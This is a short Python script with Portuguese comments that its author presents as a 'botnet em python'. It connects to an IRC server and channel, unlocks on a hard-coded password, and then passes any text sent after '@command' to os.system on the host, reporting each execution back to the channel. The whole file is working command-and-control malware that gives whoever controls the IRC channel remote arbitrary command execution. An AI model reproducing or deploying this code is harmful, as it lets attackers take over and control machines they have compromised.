#!/usr/bin/env python
# -*- coding: utf-8 -*-
#############################################
# botnet em python 
# por: Marcos Rodrigues de Carvalho
# nickname: warlock
# VOL: www.vivaolinux.com.br/~marcos_warlock 
# distribuição Gnu/Linux: Slackware 14.1
#############################################

import socket, os, time
from re import search

#Configuração do servidor IRC
server = 'irc.freenode.net'
porta = 6667
canal = '#testeprogramaboot'
nick = 'controle'
password = 'senha1234'

# Cria o servidor socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((server, porta))
s.send('NICK %s\r\n' %nick)
s.send('USER ' + nick + ' ' + nick + ' ' + nick + ' .:\n')
s.send('Join %s\r\n' %canal)
time.sleep(2)
print (s.recv(1024))

#Verifica o que é digitado no canal
# Se for digitado "@ligar + senha", o status da variável teste passa para True
# Se não o status da variável permanece False.
teste = False
while teste != True:
    msg = s.recv(5000)
    print (msg)
    if msg[0:4] == 'PING':
        s.send(msg.replace('PING', 'PONG'))
    if search('@ligar %s' %password, msg):
        teste = True
        s.send('PRIVMSG %s : Conectado com sucesso!\r\n' %canal)

# Verifica o que é digitado no canal do irc       
# Se for digitado "@command + comando", o programa executa o comando informado no 
# servidor que está rodando o botnet
# EXEMPLO: @command clear
# EXPLICAÇÃO: Será executado o comando clear que limpará a tela.
while True:
    msg = s.recv(5000)
    print (msg)
    if msg[0:4] == 'PING':
        s.send(msg.replace('PING', 'PONG'))
    if search('@command', msg):
        msg = msg.split('@command')
        msg = msg[1].split('\r\n')
        os.system(msg[0])
        s.send('PRIVMSG %s : Comando [ %s ] executado com sucesso!\r\n' %(canal, str(msg[0])))



